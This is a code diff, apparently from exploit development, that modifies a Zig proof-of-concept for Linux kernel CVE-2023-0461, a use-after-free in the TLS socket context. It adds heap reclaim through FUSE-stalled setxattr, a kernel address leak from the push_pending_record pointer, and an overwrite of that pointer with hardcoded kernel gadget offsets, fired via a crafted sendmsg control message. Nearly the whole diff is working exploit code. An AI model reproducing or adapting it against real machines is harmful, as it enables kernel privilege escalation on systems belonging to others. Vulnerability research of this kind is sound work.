@@ -20,6 +20,8 @@ const TLS = struct {
     pub const TX = 1;
     pub const RX = 2;
     pub const TX_ZEROCOPY_RO = 3;
+
+    pub const SET_RECORD_TYPE = 1;
 };
 
 const F = struct {
@@ -131,6 +133,22 @@ comptime {
 const iovec_const = extern struct {
     iov_base: [*c]const u8,
     iov_len: usize,
+};
+
+const Cmsghdr = extern struct {
+    len: usize,
+    level: i32,
+    kind: i32,
+};
+
+comptime {
+    assert(@sizeOf(Cmsghdr) == 16);
+}
+
+const TLSRecordType = extern struct {
+    cmsghdr: Cmsghdr,
+    kind: u8,
+    pad: [7]u8 = .{0xaa} ** 7,
 };
 
 const allc = std.heap.page_allocator;
@@ -330,13 +348,20 @@ fn cve_2023_0461() !void {
         try os.setsockopt(client_sk0, SOL.TCP, l.TCP.ULP, "tls");
         try setTLSOpt(client_sk0, .RX);
         defer os.closeSocket(client_sk0);
-        try psync.cont(1);
 
-        log.info("child: connect for second connection", .{});
+        try psync.cont(1);
+        try csync.wait(2);
+
+        log.info("child: accept sendmsg sk", .{});
+        const client_sk_conn = try os.accept(target_sk, null, null, 0);
+        defer os.closeSocket(client_sk_conn);
+
         const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
         defer os.closeSocket(client_sk1);
-        try csync.wait(2);
+        log.info("client: connect for free context sk", .{});
         try retry_connect(client_sk1, target_addr_p, addr_sz);
+
+        try psync.cont(3);
 
         log.info("child: wait for parent to enter setxattr", .{});
         var end = false;
@@ -434,7 +459,7 @@ fn cve_2023_0461() !void {
 
         try fuse.do_one(ops); //SETATTR
 
-        try psync.cont(3);
+        try psync.cont(4);
         try psync.write(ctx);
 
         try fuse.do_one(ops); //GETATTR sb
@@ -442,17 +467,30 @@ fn cve_2023_0461() !void {
         log.info("child: wait for parent to allocate xattr value buf", .{});
         os.nanosleep(1, 0);
 
-        // try os.setsockopt(
-        //     target_sk,
-        //     l.SOL.TLS,
-        //     @intFromEnum(TLSOpt.TX),
-        //     mem.asBytes(&ctx),
-        // );
+        const rec_cmsg = TLSRecordType{
+            .cmsghdr = .{
+                .len = @sizeOf(TLSRecordType),
+                .level = l.SOL.TLS,
+                .kind = TLS.SET_RECORD_TYPE,
+            },
+            .kind = 0x69,
+        };
 
-        const lolwat: u32 = 0x0ddba115;
-        try os.setsockopt(target_sk, SOL.TCP, l.TCP.NOTSENT_LOWAT, mem.asBytes(&lolwat));
+        const cmsg = os.msghdr_const{
+            .name = null,
+            .namelen = 0,
+            .iov = &[_]os.iovec_const{},
+            .iovlen = 0,
+            .control = @ptrCast(&rec_cmsg),
+            .controllen = rec_cmsg.cmsghdr.len,
+            .flags = 0,
+        };
 
-        try psync.cont(4);
+        log.info("child: Using sendmsg to trigger push_pending_record", .{});
+        _ = try os.sendmsg(client_sk_conn, &cmsg, 0);
+
+        try psync.cont(5);
+        log.info("child: Goodbye!", .{});
 
         return;
     }
@@ -467,41 +505,51 @@ fn cve_2023_0461() !void {
     try psync.wait(1);
     log.info("parent: disconnect", .{});
     try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
-    try os.bind(target_sk, target_addr_p, addr_sz);
 
     log.info("parent: listen for second connection", .{});
-
+    try os.bind(target_sk, target_addr_p, addr_sz);
     try os.listen(target_sk, 1);
+
     try csync.cont(2);
 
-    const client_sk = try os.accept(target_sk, null, null, 0);
-    log.info("parent: free the context", .{});
-    os.closeSocket(client_sk);
+    log.info("parent: connect for sendmsg sk", .{});
+    const client_sk2 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
+    defer os.closeSocket(client_sk2);
+    try retry_connect(client_sk2, target_addr_p, addr_sz);
+
+    // Best to free the ctx and allocate the xattr on the same CPU
+    log.info("parent: accept and use sk to free context", .{});
+    const client_sk_close = try os.accept(target_sk, null, null, 0);
+    os.closeSocket(client_sk_close);
 
     var ctx_xattr: [512]u8 = .{0x00} ** 512;
-
-    log.info("parent: wait for deferred free", .{});
 
     const name: [:0]const u8 = "user.bar";
     const xattr_path: [:0]const u8 = "/tmp/fuse-cve/foo";
 
+    try psync.wait(3);
+
+    log.info("parent: wait for deferred free", .{});
     os.nanosleep(6, 0);
 
-    while (try psync.retry(3)) {
+    while (try psync.retry(4)) {
         const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
         const err = os.errno(res);
         log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
     }
 
     var ctx = try psync.read(TLSContext);
-    const kernel_text =
-        ctx.push_pending_record - tls_sw_push_pending_record_offset;
+    const kernel_text = if (ctx.push_pending_record > 0)
+        ctx.push_pending_record - tls_sw_push_pending_record_offset
+    else
+        0x0;
 
-    log.info("child: kernel .text = {x}", .{kernel_text});
+    log.info("parent: kernel .text = {x}", .{kernel_text});
 
-    // The salt is 4 bytes and is prepended to the IV
-    ctx.sk_proto = ctx.rx.iv + 4 - 72;
+    ctx.pending_open_record_frags = 0xff;
+    ctx.push_pending_record = kernel_text + 0x48751;
     @memcpy(ctx_xattr[0..@sizeOf(TLSContext)], mem.asBytes(&ctx));
+    @memcpy(ctx_xattr[0..8], mem.asBytes(&(kernel_text + 0x71b0a3)));
 
     {
         const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
@@ -509,7 +557,7 @@ fn cve_2023_0461() !void {
         log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
     }
 
-    try psync.wait(4);
+    try psync.wait(5);
 
     log.info("Goodbye!", .{});
 }
